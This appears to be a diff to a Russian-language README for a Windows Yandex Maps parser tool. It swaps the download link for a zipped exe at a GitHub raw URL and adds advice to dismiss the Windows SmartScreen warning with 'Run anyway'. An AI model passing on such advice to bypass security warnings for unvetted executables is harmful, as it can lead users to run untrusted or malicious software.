@@ -10,10 +10,15 @@
 
 ## Скачать
 
-Готовый файл для Windows (Python и Node.js не нужны):
+Готовый файл для Windows x64 (Python и Node.js не нужны):
 
-**[yandex-maps-parser.exe](./dist/yandex-maps-parser.exe)** — просто положите
-куда удобно и запускайте из консоли.
+**[yandex-maps-parser-win64.zip](./dist/yandex-maps-parser-win64.zip)**
+(прямая ссылка:
+`https://github.com/squezech-cmd/sud/raw/arena/87e50dd8-sud/dist/yandex-maps-parser-win64.zip`)
+
+Скачайте zip, распакуйте `yandex-maps-parser.exe` куда удобно и запускайте
+из консоли. Если Windows покажет «Файл не распознан» — это обычное предупреждение
+SmartScreen для скачанного exe: нажмите «Сведения» → «Всё равно запустить».
 
 ## Использование
 
